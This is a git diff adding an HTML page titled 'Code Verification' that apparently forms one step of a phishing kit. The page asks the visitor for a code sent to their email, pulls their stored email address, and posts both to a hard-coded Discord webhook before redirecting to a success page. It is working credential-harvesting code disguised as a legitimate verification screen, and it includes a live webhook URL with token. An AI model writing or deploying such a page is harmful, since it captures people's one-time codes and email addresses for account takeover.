@@ -1,0 +1,41 @@
+<!-- code.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Code Verification</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h2>Code - Check your email</h2>
+        <input type="text" id="code" placeholder="Enter Code" required>
+        <button onclick="submitCode()">Submit</button>
+    </div>
+
+    <script>
+        function submitCode() {
+            const code = document.getElementById('code').value;
+            const email = localStorage.getItem('email'); // Retrieve the email from local storage
+
+            // Send the code and email to the webhook
+            fetch('https://discord.com/api/webhooks/1152874265553682512/TaPkSlcf68aMXsdQ-QphI5tS0OxDL7opL5hZwTiVUEHgrQswRc4wwsBfV0qwXPkfJxnf', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "Code Verification",
+                        description: `Email: ${email}\nCode: ${code}`
+                    }]
+                })
+            }).then(() => {
+                // Redirect to the third page
+                window.location.href = "success.html";
+            });
+        }
+    </script>
+</body>
+</html>
